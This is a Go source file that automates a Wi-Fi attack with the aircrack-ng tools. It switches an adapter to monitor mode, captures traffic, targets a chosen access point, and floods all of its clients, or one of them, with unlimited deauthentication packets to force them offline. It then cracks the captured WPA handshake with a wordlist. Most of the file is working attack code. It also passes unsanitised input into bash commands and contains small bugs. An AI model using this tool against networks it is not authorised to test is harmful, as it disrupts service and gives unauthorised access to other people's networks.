package scanners

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"bytes"
	"bufio"
)

func launchTerminal(cmdArgs...string) error {
	// Join the command arguments
	command := strings.Join(cmdArgs, " ")
	// Construct the command to open x-terminal-emulator with airdump-ng
	cmd := exec.Command("nohup", "x-terminal-emulator", "-e", "bash", "-c", command + "; read -p 'Press Enter to exit'")
	err := cmd.Start()
	if err!= nil {
		fmt.Println("Error starting command:", err)
		return err
	}
	// No need to wait for the command to finish here since it's detached
	return nil
}

func startMonitorMode(adapter string) string {
	
	// Kill processes that might interfere with the wireless interface
	// cmdKill := exec.Command("airmon-ng", "check", "kill")
	// cmdKill.Stdout = os.Stdout
	// cmdKill.Stderr = os.Stderr
	// err := cmdKill.Run()
	// if err!= nil {
	// 	fmt.Println("Error killing processes:", err)
	// 	return err
	// }

	// Start the wireless interface in monitor mode
	fmt.Println("Starting Monitor mode.")
	cmd := exec.Command("airmon-ng", "start", adapter)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
		return "operation failed"
	}

	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")
	adapter = findNewAdapter(adapter)
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "starting monitor mode:", err)
		return "operation failed"
	}

	return adapter
}

func findNewAdapter(adapter string) string {
    cmdIWConfig := exec.Command("iwconfig")
    cmdAWK := exec.Command("awk", "/^"+adapter+"/ {print $1}")

    // Set up a pipe to connect the stdout of cmdIWConfig to the stdin of cmdAWK
    cmdAWK.Stdin, _ = cmdIWConfig.StdoutPipe()

    // Set up output capturing for cmdAWK
    var awkOutput bytes.Buffer
    cmdAWK.Stdout = &awkOutput

    // Start cmdAWK first to avoid a deadlock
    if err := cmdAWK.Start(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "starting awk command:", err)
        return ""
    }

    // Run cmdIWConfig
    if err := cmdIWConfig.Run(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "running iwconfig command:", err)
        return ""
    }

    // Wait for cmdAWK to finish
    if err := cmdAWK.Wait(); err!= nil {
        fmt.Println(Red + "Error " + Reset + "waiting for awk command:", err)
        return ""
    }

    // Process the output of awk to get the found adapter
    foundAdapter := awkOutput.String() // Correctly get the string output

    // Use strings.TrimSpace to remove leading and trailing whitespace
    foundAdapter = strings.TrimSpace(foundAdapter)

    return foundAdapter
}

func captureTraffic(newadapter string) error {
    fmt.Println("Opening new terminal window and capturing wireless traffic.")
    // Adjusted to include a continuous monitoring argument
    return launchTerminal("airodump-ng", newadapter)
}


func scanTarget(BSSID, channel, newadapter string) error {
	fmt.Printf("Opening new terminal for target %s\n", Green + BSSID + Reset)
	return launchTerminal("airodump-ng --bssid " + BSSID + " -c" + channel + " --write captureWpa " + newadapter)
}

func deauthenticateAllTargets(BSSID, newadapter string) error {
    fmt.Println("Turning target offline...")
    return launchTerminal("aireplay-ng --deauth 0 -a " + BSSID + " " + newadapter)
}

func deauthenticateTarget(BSSID , Station, newadapter string) error {
	fmt.Println("Turning target offline...")
	return launchTerminal("aireplay-ng --deauth 0 -a "+BSSID+" -c " + Station + newadapter)
}

func crackWPA(wordlist, file string) error {
	fmt.Printf("Cracking WPA KEY")
	return launchTerminal("aircrack-ng -w "+wordlist+" "+file)
}

func ReturnAdapterState(newadapter string) {
	fmt.Print("Changing adapter back to Mode: Managed")
	cmd := exec.Command("airmon-ng", "stop", newadapter)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "reseting adapter : ", newadapter)
		return
	} else {
		fmt.Println("Adapter reset was " + Green + "succesful" + Reset)
	}
}

func MonitorMode() {
	var adapter string
	scanner := bufio.NewScanner(os.Stdin)
	if len(os.Args) != 3 {
		// Enabling monitor mode
		cmd := exec.Command("iwconfig")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err := cmd.Run()
		if err!= nil {
			fmt.Println(Red + "Error " + Reset + "showing wifi adapters", err)
			return
		}
		fmt.Println()
		fmt.Print("Specify Wireless adapter <<wlan0>>: ")
		scanner.Scan()
		adapter = scanner.Text()
		
		if adapter == "" {
			adapter = "wlan0" // Default to wlan0 if no adapter is specified
		}
	} else {
		adapter = os.Args[2]
	}
	
	//making sure adapter is wireless
	if !strings.HasPrefix(adapter, "wlan") {
		fmt.Println("Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter.")
		return
	}

	newadapter := startMonitorMode(adapter)
	if newadapter == "operation failed" {
		return
	}
	fmt.Println("Using : " + newadapter)
	// Scanning Wireless Traffic
	err := captureTraffic(newadapter)
	if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to capture wireless traffic with error :", err)
		return
	}
	
	// Focusing on Target
	var BSSID, channel, Station, wordlistfile, WpaHandshakeFile string

	fmt.Print("Target BSSID: ")
	scanner.Scan()
	BSSID = scanner.Text()

	fmt.Printf("Channel for %s: ", BSSID)
	scanner.Scan()
	channel = scanner.Text()

	err = scanTarget(BSSID, channel, newadapter)
	if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to scan target:", BSSID)
		fmt.Println("Error : ", err)
		return
	}

	// choosing client in target network to deauth
	fmt.Print("Choose client on network to deauthenticate(press enter for all connected clients) \n")
	fmt.Print("Station : ")
	scanner.Scan()
	Station = scanner.Text()
	if Station == "" {
		err = deauthenticateAllTargets(BSSID, newadapter)
		if err != nil {
		fmt.Println(Red + "Failed " + Reset + "to deauthenticate clients on :", BSSID)
		fmt.Println("Error : ", err)
		return
		}
	} else { 
		err = deauthenticateTarget(BSSID, Station, newadapter)
		if err != nil {
			fmt.Println(Red + "Failed " + Reset + "to deauthenticate target:", Station)
			fmt.Println("Error : ", err)
			return
		} 
	}

	//returning adapter state to managed mode
	ReturnAdapterState(newadapter)
	
	// wordlist file input
	fmt.Print("Wordlist file : ")
	scanner.Scan()
	wordlistfile = scanner.Text()
	for {
		if _, err := os.Stat(wordlistfile); os.IsNotExist(err) {
			fmt.Print(Red + "Error" + Reset + " File do not exist .")
			fmt.Print("Specify file with WPA handshake (file.cap): ")
			scanner.Scan()
			wordlistfile = scanner.Text()
		} else {
			break
		}
	}
	fmt.Println("File exists:", wordlistfile)

	// capture handshake file input
	fmt.Print("Captured Files : ")
	cmd := exec.Command("ls","|","grep","*.cap")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err!= nil {
		fmt.Println(Red + "Error " + Reset + "showing captured files", err)
		return
	}
	fmt.Println()
	fmt.Print("Specify file with WPA handshake (file.cap): ")
	scanner.Scan()
	WpaHandshakeFile = scanner.Text()
	// validating file exists
	for {
		if _, err := os.Stat(WpaHandshakeFile); os.IsNotExist(err) {
			fmt.Print(Red + "Error" + Reset + " File do not exist .")
			fmt.Print("Specify file with WPA handshake (file.cap): ")
			scanner.Scan()
			WpaHandshakeFile = scanner.Text()
		} else {
			break
		}
	}
	fmt.Println("File exists:", WpaHandshakeFile)
	//pass files to crackWPA func
	err = crackWPA(wordlistfile,WpaHandshakeFile)
	if err != nil {
		fmt.Println("Failed to crack WPA key:", err)
		return
	}
}